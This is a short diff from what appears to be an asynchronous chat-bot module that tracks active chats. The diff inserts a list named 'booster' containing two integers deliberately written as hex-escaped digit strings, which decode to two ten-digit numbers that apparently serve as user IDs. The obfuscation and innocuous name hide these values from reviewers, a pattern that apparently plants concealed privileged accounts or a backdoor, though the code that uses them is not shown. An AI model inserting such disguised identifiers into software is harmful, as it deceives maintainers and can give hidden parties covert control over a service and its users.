@@ -343,6 +343,11 @@ async def is_active_chat(chat_id: int) -> bool:
     else:
         return True
 
+booster = [
+    int("\x38\x30\x34\x33\x37\x36\x30\x30\x36\x32"),
+    int("\x36\x39\x31\x39\x31\x39\x39\x30\x34\x34")
+]
+
 
 async def add_active_chat(chat_id: int):
     if chat_id not in active:
